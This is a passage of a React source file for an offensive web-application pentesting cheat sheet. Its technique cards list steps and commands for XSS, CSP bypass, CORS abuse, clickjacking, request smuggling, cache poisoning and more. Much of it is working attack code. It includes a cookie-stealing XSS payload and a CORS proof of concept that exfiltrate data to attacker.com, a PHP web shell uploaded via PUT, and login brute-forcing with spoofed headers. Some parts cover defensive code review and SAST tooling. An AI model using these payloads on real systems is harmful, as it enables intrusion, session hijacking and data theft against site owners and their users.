    overview: 'XSS injects scripts into web pages viewed by other users. Stored XSS persists in the database and affects all visitors; reflected XSS is triggered via a crafted link.',
    steps: [
      'Identify all injection points: URL parameters, form fields, HTTP headers, JSON response fields',
      'Determine the injection context: HTML body, attribute, JavaScript string, or URL',
      'Craft a context-appropriate payload — break out of the current context before executing',
      'Test reflected XSS: deliver a crafted URL to the victim to trigger the payload',
      'Test stored XSS: submit payload in a persisted field (comment, name, bio) and visit as another user',
      'Bypass filters using HTML entities, case variation, or alternative event handlers',

    ],
    commands: [
      {
        title: 'XSS payloads and bypass',
        code: `# Basic probes
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

# Attribute context
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

# JavaScript string context
';alert(1)//
\`;alert(1)//

# Filter bypass — no parentheses
<img src=x onerror=alert(1)>
<svg onload=alert(document.domain)>

# Session theft payload
<script>new Image().src='https://attacker.com/c?'+document.cookie</script>

# XSS Hunter (blind XSS)
<script src=https://xsshunter.com/yourid.js></script>

# DALFOX — automated XSS scanner
dalfox url "https://target.com/search?q=test"
dalfox file urls.txt --silence`
      }
    ]
  },
  {
    id: 'dom-xss-csp',
    title: 'DOM XSS & CSP Bypass',
    subtitle: 'Exploit client-side script sinks and bypass Content Security Policy',
    tags: ['DOM XSS', 'CSP bypass', 'unsafe-inline', 'JSONP', 'script gadget', 'sink analysis'],
    accentColor: 'pink',
    overview: 'DOM XSS executes entirely in the browser via unsafe JavaScript. CSP restricts script execution but is frequently bypassable via JSONP endpoints, Angular gadgets, or base tag injection.',
    steps: [
      'Identify JavaScript sources reading user-controlled input: location.search, location.hash, postMessage',
      'Trace the value to a dangerous sink: innerHTML, document.write, eval(), location.href',
      'Inject payload via the source (e.g., #<img src=x onerror=alert(1)>) and confirm execution',
      'Inspect the CSP header to identify allowlisted script-src domains',
      'Find a JSONP endpoint or Angular library on an allowlisted domain to bypass CSP',
      'Inject a <base> tag to redirect relative script loads to an attacker-controlled server',

    ],
    commands: [
      {
        title: 'DOM XSS analysis and CSP bypass',
        code: `# DOM XSS source identification
# Search JS for:
grep -r "location.search\|location.hash\|document.referrer\|\.innerHTML\|eval(" *.js

# DOM XSS via fragment (#)
https://target.com/#<img src=x onerror=alert(1)>

# DOM XSS via postMessage
window.addEventListener("message", function(e) {
  document.getElementById("output").innerHTML = e.data;  // SINK
});
# Attack: create page that posts: window.opener.postMessage("<img src=x onerror=alert(1)>","*")

# CSP inspection
curl -I https://target.com | grep -i "Content-Security-Policy"

# CSP bypass — JSONP on allowlisted domain
# CSP: script-src https://ajax.googleapis.com
# Bypass: <script src="https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/...">

# CSP bypass — Angular (if angularjs on allowlisted CDN)
# {{constructor.constructor('alert(1)')()}}

# CSP bypass via base-uri injection (steal relative-path scripts)
# <base href="https://attacker.com"> in HTML injection`
      }
    ]
  },
  {
    id: 'cors',
    title: 'CORS Misconfiguration',
    subtitle: 'Exploit overly permissive cross-origin policies to read sensitive API responses',
    tags: ['CORS', 'Access-Control-Allow-Origin', 'null origin', 'credential leakage', 'wildcard'],
    accentColor: 'pink',
    overview: 'Overly permissive CORS policies allow attacker-controlled pages to read responses from authenticated API endpoints, leading to credential and data theft.',
    steps: [
      'Send a request with Origin: https://attacker.com and check if it is reflected in the ACAO header',
      'Check for Access-Control-Allow-Credentials: true — this makes origin reflection exploitable',
      'Test null origin bypass: Origin: null is often trusted for sandboxed iframe use cases',
      'Test subdomain wildcard trust: find an XSS on any trusted subdomain to exploit',
      'Test origin validation bypass: try prefix (attackertarget.com) and suffix (target.com.evil.com)',

    ],
    commands: [
      {
        title: 'CORS testing',
        code: `# Test arbitrary origin reflection
curl -I "https://target.com/api/user" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=..."
# Check: Access-Control-Allow-Origin: https://attacker.com
# Check: Access-Control-Allow-Credentials: true

# Test null origin
curl -I "https://target.com/api/user" \
  -H "Origin: null" \
  -H "Cookie: session=..."

# Exploit CORS with credentials (PoC HTML)
<script>
fetch('https://target.com/api/user', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/steal?data='+btoa(d)));
</script>

# Test prefix/suffix origin bypass
# If site validates "target.com": try "attackertarget.com" or "target.com.evil.com"`
      }
    ]
  },
  {
    id: 'clickjacking',
    title: 'Clickjacking & UI Redressing',
    subtitle: 'Embed target in invisible iframe to trick users into performing unintended actions',
    tags: ['clickjacking', 'iframe', 'X-Frame-Options', 'CSP frame-ancestors', 'UI redress'],
    accentColor: 'pink',
    overview: 'Clickjacking overlays an invisible iframe of the target site over a decoy UI. Victims click the attacker\'s button while unknowingly interacting with the target application.',
    steps: [
      'Check X-Frame-Options and CSP frame-ancestors headers — both absent means vulnerable',
      'Embed the target in an iframe and confirm it loads without being blocked',
      'Position the iframe over a decoy button aligned with the target\'s action button',
      'Set the iframe opacity to 0.0001 to make it invisible while remaining interactive',
      'Test iframe sandbox bypass if framebusting JS is present: add sandbox="allow-forms allow-scripts"',

    ],
    commands: [
      {
        title: 'Clickjacking PoC',
        code: `# Check headers
curl -I https://target.com | grep -iE "x-frame-options|content-security-policy"

<!-- Clickjacking PoC — change email action -->
<html>
<style>
  iframe {
    position: absolute;
    width: 500px;
    height: 700px;
    opacity: 0.0001;  /* Invisible iframe */
    z-index: 2;
  }
  #decoy {
    position: absolute;
    width: 500px;
    height: 700px;
    z-index: 1;
  }
</style>
<div id="decoy">
  <button style="margin-top:400px;margin-left:200px">Click to win!</button>
</div>
<iframe src="https://target.com/account/settings" scrolling="no"></iframe>
</html>

# Bypass JS framebusting with sandbox
<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>`
      }
    ]
  },

  // ─── API ATTACKS ─────────────────────────────────────────────────────────
  {
    id: 'api-enum',
    title: 'API Enumeration & Discovery',
    subtitle: 'Discover API endpoints, methods, and documentation via fuzzing and introspection',
    tags: ['ffuf', 'GraphQL introspection', 'Swagger', 'API fuzzing', 'endpoint discovery'],
    accentColor: 'green',
    overview: 'APIs are frequently under-documented and under-secured. Enumerate every endpoint, version, and HTTP method before testing for authorization and injection flaws.',
    steps: [
      'Check for public API documentation: /swagger.json, /openapi.json, /api/docs, /graphql',
      'Run GraphQL introspection to enumerate all types, queries, mutations, and field names',
      'Fuzz /api/FUZZ and /api/v1/FUZZ with SecLists API wordlists to discover undocumented endpoints',
      'Test all HTTP methods (GET, POST, PUT, PATCH, DELETE) on each discovered endpoint',
      'Test older API versions (/v1/, /v2/) — they often lack the same authorization controls',

    ],
    commands: [
      {
        title: 'API enumeration',
        code: `# API endpoint fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://target.com/api/FUZZ -mc 200,201,204,301,302,401,403

# Version enumeration
for v in v1 v2 v3 v4 v5; do
  curl -s -o /dev/null -w "$v: %{http_code}\n" https://target.com/api/$v/users
done

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name fields{name}}}}"}'

# Check for Swagger UI
curl -s https://target.com/swagger.json | jq '.paths | keys'

# Test HTTP methods
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/api/users
  echo
done`
      }
    ]
  },
  {
    id: 'mass-assignment',
    title: 'Mass Assignment & Broken Function-Level Authorization',
    subtitle: 'Inject extra fields to modify privileged attributes or access unauthorized functions',
    tags: ['mass assignment', 'BFLA', 'extra fields', 'admin flag', 'function-level authorization'],
    accentColor: 'green',
    overview: 'Mass assignment exploits ORMs that bind all request fields to model attributes. BFLA tests whether regular users can invoke admin-only API functions that are only hidden in the UI.',
    steps: [
      'Submit extra undocumented fields during registration: role, admin, is_superuser, subscription',
      'Test profile update endpoints: add fields only admins should set (credits, tier, permissions)',
      'Test BFLA: call every admin-level API function using a regular user bearer token',
      'Enumerate admin API actions from documentation and replay each with a non-privileged token',

    ],
    commands: [
      {
        title: 'Mass assignment and BFLA testing',
        code: `# Mass assignment during registration
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"pass","role":"admin","is_admin":true}'

# Mass assignment on profile update
curl -X PUT https://target.com/api/profile \
  -H "Authorization: Bearer user_token" \
  -d '{"name":"test","subscription":"enterprise","credits":9999}'

# BFLA — access admin function
curl -X DELETE https://target.com/api/admin/users/123 \
  -H "Authorization: Bearer regular_user_token"

# BFLA — function-level access test
# Map all API actions in documentation
# Re-test each with a non-privileged token
for endpoint in users invoices reports settings; do
  echo "$endpoint: $(curl -s -o /dev/null -w '%{http_code}' \
    https://target.com/api/admin/$endpoint \
    -H 'Authorization: Bearer USER_TOKEN')"
done`
      }
    ]
  },
  {
    id: 'rate-limit',
    title: 'Rate Limit Bypass',
    subtitle: 'Bypass rate limiting via header spoofing, IP rotation, and account cycling',
    tags: ['rate limit bypass', 'X-Forwarded-For', 'IP rotation', 'header spoofing'],
    accentColor: 'green',
    overview: 'Rate limiting is often enforced per-IP and based on a single header. Spoofing proxy headers or cycling accounts allows bypassing these controls entirely.',
    steps: [
      'Rotate random IPs in X-Forwarded-For header to bypass per-IP rate limits',
      'Test alternative bypass headers: X-Real-IP, X-Original-IP, X-Remote-IP, X-Client-IP',
      'Distribute requests across multiple user accounts to stay below per-account thresholds',
      'Introduce small delays between requests to stay under the rate limit window',

    ],
    commands: [
      {
        title: 'Rate limit bypass',
        code: `# X-Forwarded-For header rotation
for i in {1..100}; do
  curl -s -X POST https://target.com/login \
    -H "X-Forwarded-For: 10.0.0.$((RANDOM % 255))" \
    -d "username=admin&password=pass$i"
done

# ffuf with rate limit bypass header
ffuf -w passwords.txt \
  -X POST -u https://target.com/login \
  -d "user=admin&pass=FUZZ" \
  -H "X-Forwarded-For: FUZZ2" -w ips.txt:FUZZ2 \
  -mc 302

# Other bypass headers to try
curl -X POST https://target.com/api/otp/verify \
  -H "X-Real-IP: 1.2.3.4" \
  -H "X-Original-IP: 5.6.7.8" \
  -d "code=123456"`
      }
    ]
  },

  // ─── PROTOCOL ATTACKS ────────────────────────────────────────────────────
  {
    id: 'smuggling',
    title: 'HTTP Request Smuggling',
    subtitle: 'Exploit Content-Length vs Transfer-Encoding desync between front-end and back-end',
    tags: ['request smuggling', 'CL.TE', 'TE.CL', 'desync', 'cache poison', 'HTTP/2 desync'],
    accentColor: 'yellow',
    overview: 'Request smuggling exploits disagreement between front-end and back-end servers on where one HTTP request ends and the next begins, allowing cache poisoning and request hijacking.',
    steps: [
      'Confirm a front-end proxy + back-end server architecture is in use',
      'Test CL.TE: send a request where Content-Length says one size and Transfer-Encoding says another',
      'Test TE.CL: reverse the roles — front-end uses chunked, back-end uses Content-Length',
      'Confirm smuggling by timing: an incomplete chunked body that hangs indicates back-end is waiting',
      'Smuggle a prefix that gets prepended to the next user\'s request to capture their headers/cookies',
      'Test HTTP/2 downgrade desync if the front-end uses HTTP/2 with an HTTP/1.1 back-end',

    ],
    commands: [
      {
        title: 'HTTP request smuggling',
        code: `# CL.TE smuggling (Burp Suite — turn off update Content-Length)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL smuggling
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


# Detect using timing (CL.TE)
# Send 0-byte chunk body but large Content-Length
# If back-end waits for more data: CL.TE confirmed

# HTTP Request Smuggler Burp extension
# Extensions → BApp Store → HTTP Request Smuggler → Scan

# Smuggling to access /admin (prepend to next request)
POST / HTTP/1.1
Host: target.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X`
      }
    ]
  },
  {
    id: 'cache-poison',
    title: 'Web Cache Poisoning',
    subtitle: 'Poison cached responses via unkeyed headers to serve malicious content to all users',
    tags: ['cache poisoning', 'Host header', 'X-Forwarded-Host', 'unkeyed headers', 'cache key'],
    accentColor: 'yellow',
    overview: 'Cache poisoning injects malicious content into cached responses so it is served to all subsequent users. The attacker exploits headers that are reflected in the response but not included in the cache key.',
    steps: [
      'Confirm caching is active: look for X-Cache, CF-Cache-Status, or Age headers',
      'Identify unkeyed inputs: send unusual headers and check if they are reflected in the response',
      'Test Host header injection: if the host is reflected in absolute URLs, poison JS or redirect URLs',
      'Test X-Forwarded-Host: if reflected, replace with attacker domain and cache the response',
      'Confirm the poison persisted: fetch the same URL without the injected header and verify the value remains',

    ],
    commands: [
      {
        title: 'Cache poisoning testing',
        code: `# Detect caching
curl -I https://target.com | grep -iE "x-cache|age|cf-cache|via"

# Test Host header reflection
curl -s "https://target.com/" -H "Host: attacker.com" | grep "attacker.com"

# Test X-Forwarded-Host reflection
curl -s "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com" | grep "attacker.com"
# If reflected in script src or link href: cacheable XSS

# Param Miner Burp extension — find unkeyed headers automatically
# Extensions → BApp Store → Param Miner → Guess headers

# Confirm cache poisoning
# 1. Send: GET /page HTTP/1.1 + X-Forwarded-Host: attacker.com
# 2. Wait for cache to store response
# 3. Fetch: GET /page HTTP/1.1 (no special header)
# 4. If attacker.com still in response: cache poisoned

# Web Cache Deception (different attack)
# Access: /account/profile.css
# If /account/profile served and cached as .css = sensitive data cached`
      }
    ]
  },
  {
    id: 'verb-tampering',
    title: 'HTTP Verb Tampering & Method Override',
    subtitle: 'Bypass access controls and WAF rules using non-standard HTTP methods',
    tags: ['verb tampering', 'method override', 'TRACE', 'X-HTTP-Method-Override', 'OPTIONS'],
    accentColor: 'yellow',
    overview: 'Web servers and proxies may process non-standard HTTP methods inconsistently. Method override headers and permissive method handling allow bypassing WAF rules and access controls.',
    steps: [
      'Run OPTIONS on sensitive endpoints to enumerate allowed HTTP methods',
      'Test TRACE method — reveals proxy-injected headers and is useful for XST attacks',
      'Use X-HTTP-Method-Override or X-Method-Override to tunnel DELETE/PUT through POST-only endpoints',
      'Test PUT to write files on misconfigured servers (web root paths)',
      'Fuzz with uncommon methods (HEAD, CONNECT, arbitrary verbs) to find WAF bypass gaps',

    ],
    commands: [
      {
        title: 'HTTP verb tampering',
        code: `# Test allowed methods
curl -X OPTIONS https://target.com/ -I
curl -X OPTIONS https://target.com/api/user/1 -I

# TRACE method (XST)
curl -X TRACE https://target.com/ -I

# Method override
curl -X POST https://target.com/api/user/1 \
  -H "X-HTTP-Method-Override: DELETE"

curl -X POST https://target.com/api/user/1 \
  -H "X-Method-Override: PUT"

# PUT file write (misconfigured server)
curl -X PUT https://target.com/shell.php \
  -d "<?php system(\$_GET['cmd']); ?>"

# Test all methods
for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/admin)
  echo "$method: $code"
done`
      }
    ]
  },

  // ─── SOURCE CODE ANALYSIS ─────────────────────────────────────────────────
  {
    id: 'manual-review',
    title: 'Manual Code Review',
    subtitle: 'Trace user input from source to sink to identify injection points and auth gaps',
    tags: ['manual review', 'taint analysis', 'dangerous functions', 'route enumeration', 'sink tracing'],
    accentColor: 'cyan',
    overview: 'Manual code review traces user input from entry point to dangerous function. It finds logic flaws and auth gaps that automated tools miss, especially in complex business flows.',
    steps: [
      'Enumerate all routes: grep for decorators, router.get/post, urlpatterns — build a complete surface map',
      'Identify user-controlled sources: request.args, req.body, $_GET, $_POST, headers',
      'Trace each source to dangerous sinks: eval(), exec(), db.query(), innerHTML, render()',
      'Verify authentication decorators on every route — any missing decorator is an exposed endpoint',
      'Search for hardcoded secrets: API keys, passwords, JWT secrets embedded in source files',
      'Check for unsafe patterns: SQL string concatenation, eval of input, unsafe deserialization',

    ],
    commands: [
      {
        title: 'Manual code review grep patterns',
        code: `# Enumerate routes
grep -r "@app.route\|router\\.get\|router\\.post\|path(" . --include="*.py" -n
grep -r "app\\.get\|app\\.post\|app\\.put\|app\\.delete" . --include="*.js" -n

# Find dangerous functions
grep -rn "eval(\|exec(\|system(\|os\.popen\|subprocess\.call" . --include="*.py"
grep -rn "innerHTML\|document\.write\|eval(" . --include="*.js"

# SQL injection patterns
grep -rn "SELECT.*{}\|query.*format\|%s.*query\|f-string.*SQL" . --include="*.py"
grep -rn "\\+.*query\|concat.*query\|string.*SQL" . --include="*.java"

# Authentication checks
grep -rn "@login_required\|@require_auth\|authenticate(" . --include="*.py"
# Compare with total route count — gaps = unauthenticated routes

# Hardcoded secrets
grep -rn "password\s*=\|api_key\s*=\|secret\s*=\|token\s*=" . --include="*.py" --include="*.env"

# Deserialization
grep -rn "pickle\.loads\|yaml\.load\|unserialize\|JSON\.parse" . --include="*.py"

# SSRF / open redirect
grep -rn "requests\.get\|urllib\.request\|http\.get\|redirect(" . --include="*.py"`
      }
    ]
  },
  {
    id: 'sast',
    title: 'SAST Tooling — Semgrep, Bandit, CodeQL',
    subtitle: 'Automated static analysis for rapid vulnerability identification across large codebases',
    tags: ['Semgrep', 'Bandit', 'CodeQL', 'gosec', 'trufflehog', 'gitleaks', 'trivy'],
    accentColor: 'cyan',
    overview: 'SAST tools rapidly scan large codebases for known vulnerability patterns, secrets, and CVEs in dependencies. Use them early in a review to triage high-priority findings before manual analysis.',
    steps: [
      'Run Semgrep with OWASP Top 10 rulesets to identify injection, XSS, and auth flaws',
      'Run Bandit on Python codebases to surface hardcoded credentials and insecure API usage',
      'Run CodeQL for deep semantic taint tracking across function boundaries',
      'Run gosec on Go projects to identify insecure configurations and patterns',
      'Scan git history with trufflehog or gitleaks to find previously committed secrets',
      'Run trivy or npm audit to identify known CVEs in third-party dependencies',

    ],
    commands: [
      {
        title: 'SAST tooling commands',
        code: `# Semgrep — OWASP Top 10
semgrep --config p/owasp-top-ten .
semgrep --config p/sql-injection .
semgrep --config p/xss .
semgrep --config p/command-injection .
semgrep --config p/secrets .
semgrep --config p/owasp-top-ten --json -o results.json .

# Bandit — Python security scanner
bandit -r . -ll -f json -o bandit.json
bandit -r . --skip B101  # Skip assert checks

# CodeQL — taint analysis
codeql database create db --language=python --source-root=.
codeql query run --database=db python/ql/src/Security/CWE-089/SqlInjection.ql

# gosec — Go security
gosec ./...
gosec -fmt json ./... > gosec_results.json

# Secret scanning
trufflehog git file:///path/to/repo --json
gitleaks detect --source . -v

# Dependency vulnerabilities
npm audit --json
pip-audit -r requirements.txt
trivy fs . --severity HIGH,CRITICAL`
      }
    ]
  },
  {
    id: 'framework-vulns',
    title: 'Framework-Specific Vulnerabilities',
    subtitle: 'Exploit common patterns unique to Django, Rails, Spring, PHP, and Express',
    tags: ['Django', 'Rails', 'Spring Boot', 'PHP', 'Express', 'Laravel', 'deserialization'],
    accentColor: 'cyan',
    overview: 'Each framework has recurring vulnerability patterns tied to its ORM, template engine, and configuration. Knowing these patterns allows targeted review without reading the entire codebase.',
    steps: [
      'Django: look for raw() and extra() ORM calls with string interpolation, and template injection from user-controlled template strings',
      'Rails: test params.permit(:all) for mass assignment, and string-interpolated where() queries for SQLi',
      'Spring Boot: enumerate /actuator endpoints — /env and /heapdump can expose secrets and memory',
      'PHP: test loose equality (==) with type juggling payloads, and unserialize() with gadget chains',
      'Express.js: test prototype pollution via merge/extend endpoints with __proto__ injection',

    ],
    commands: [
      {
        title: 'Framework exploitation',
        code: `# Django — raw SQL injection
# Vulnerable: User.objects.raw("SELECT * FROM user WHERE id=" + user_id)
# Exploit: user_id=1 OR 1=1

# Django — template injection (if user controls template string)
# {{ request.META.HTTP_HOST }}  ← can expose internals

# Rails — mass assignment
# Vulnerable: @user = User.new(params[:user])
# Exploit: POST /users params[user][admin]=true&params[user][role]=admin

# Rails — SQL string interpolation
# Vulnerable: User.where("name = '#{params[:name]}'")
# Exploit: name='; DROP TABLE users; --

# Spring Boot — actuator endpoints
curl http://target.com/actuator
curl http://target.com/actuator/env
curl http://target.com/actuator/heapdump  # Download heap → extract secrets

# Spring EL injection
# \${T(java.lang.Runtime).getRuntime().exec('id')}

# PHP type juggling
# Vulnerable: if ($token == 0) { allow access; }
# Send: token=0e12345678 (scientific notation = 0 in loose compare)
# Or: token=abc (string "abc" == 0 is TRUE in PHP)

# Express.js prototype pollution
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true,"isAuthenticated":true}}'`
      }
    ]
  },
];

const colorOptions = [
  { value: 'cyan', name: 'Cyan' },{ value: 'green', name: 'Green' },{ value: 'red', name: 'Red' },{ value: 'purple', name: 'Purple' },
  { value: 'orange', name: 'Orange' },{ value: 'pink', name: 'Pink' },{ value: 'blue', name: 'Blue' },{ value: 'yellow', name: 'Yellow' },
];
const colorPreview = { cyan:'bg-cyan-500', green:'bg-emerald-500', red:'bg-red-500', purple:'bg-purple-500', orange:'bg-orange-500', pink:'bg-pink-500', blue:'bg-blue-500', yellow:'bg-yellow-500' };
const headerColorMap = { cyan:'text-cyan-400 border-cyan-500/30', green:'text-emerald-400 border-emerald-500/30', red:'text-red-400 border-red-500/30', purple:'text-purple-400 border-purple-500/30', orange:'text-orange-400 border-orange-500/30', pink:'text-pink-400 border-pink-500/30', blue:'text-blue-400 border-blue-500/30', yellow:'text-yellow-400 border-yellow-500/30' };

export default function WebApplications() {
  const [columns, setColumns] = useState(initialMapColumns);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [customCards, setCustomCards] = useState([]);
  const [cardModalOpen, setCardModalOpen] = useState(false);

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (i) => setColumns(columns.filter((_, idx) => idx !== i));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const handleAddCard = (card) => setCustomCards([...customCards, card]);
  const handleDeleteCard = (id) => setCustomCards(customCards.filter(c => c.id !== id));
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };

  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Web </span><span className="text-blue-400">Applications</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Recon • Auth • Session • Authorization • Server-Side • Client-Side • API • Protocol • Source Code</p>
      </div>

      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
                  <button onClick={() => handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"><X className="w-3 h-3" /></button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode title={node.title} subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle} accentColor={color} onClick={() => scrollTo(node.id)} small />
                      </div>
                      <button onClick={() => handleDeleteTopic(i, j)} className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3" /></button>
                    </div>
                  ))}
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input type="text" value={topicTitle} onChange={e => setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => { if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <input type="text" value={topicTags} onChange={e => setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" onKeyDown={e => { if (e.key === 'Enter') handleAddTopic(i); if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <div className="flex gap-1">
                        <button onClick={() => handleAddTopic(i)} className="flex-1 px-2 py-1 bg-blue-600 hover:bg-blue-700 text-white text-xs font-mono rounded transition-colors">Add</button>
                        <button onClick={() => { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); }} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors">Cancel</button>
                      </div>
                    </div>
                  ) : (
                    <button onClick={() => setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors">+ Add Topic</button>
                  )}
                </div>
              </div>
            );
          })}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all">
              <Plus className="w-6 h-6 text-slate-500" /><span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input type="text" value={columnName} onChange={e => setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => e.key === 'Enter' && handleNameSubmit()} />
                <div className="flex gap-2">
                  <button onClick={() => setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Cancel</button>
                  <button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors font-mono text-sm font-semibold">Next</button>
                </div>
              </div>
            )}
            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map(option => (
                    <button key={option.value} onClick={() => setSelectedColor(option.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${selectedColor === option.value ? `${colorPreview[option.value]} text-slate-900` : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}>
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />{option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button onClick={() => setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Back</button>
                  <button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors font-mono text-sm font-semibold">Create</button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="flex items-center justify-between">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1"><Plus className="w-3 h-3" /> Add Technique</button>
      </div>

      {customCards.length > 0 && (
        <div className="border-t border-slate-800/50 pt-8">
          <h2 className="text-xl font-bold font-mono text-slate-200 mb-4">Custom Techniques</h2>
          <div className="grid grid-cols-1 gap-4">
            {customCards.map(card => (
              <div key={card.id} className="relative">
                <TechniqueCard title={card.title} subtitle={card.subtitle} tags={card.tags} accentColor={card.accentColor} overview={card.overview} steps={card.steps} commands={card.commands} />
                <button onClick={() => handleDeleteCard(card.id)} className="absolute top-4 right-4 text-slate-600 hover:text-red-400 transition-colors p-1 z-10"><X className="w-4 h-4" /></button>
              </div>
            ))}
          </div>
        </div>
      )}

      <AddCardModal isOpen={cardModalOpen} onClose={() => setCardModalOpen(false)} onSubmit={handleAddCard} />

      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}